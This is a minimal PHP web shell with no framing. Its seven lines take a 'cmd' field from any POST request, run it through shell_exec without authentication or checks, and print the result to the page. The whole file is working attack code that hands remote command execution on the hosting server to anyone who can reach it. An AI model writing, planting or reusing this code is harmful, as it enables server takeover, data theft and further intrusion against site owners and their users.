<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
